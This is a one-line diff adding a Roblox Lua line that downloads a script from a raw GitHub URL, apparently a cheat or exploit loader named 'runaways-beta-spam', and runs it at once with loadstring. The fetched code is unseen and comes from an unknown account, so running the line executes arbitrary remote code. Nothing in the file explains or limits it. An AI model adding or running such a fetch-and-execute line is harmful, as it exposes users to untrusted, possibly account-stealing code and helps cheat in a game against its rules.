@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/runaways-beta-spam1-neqm3pg8ocdhe3.lua"))()
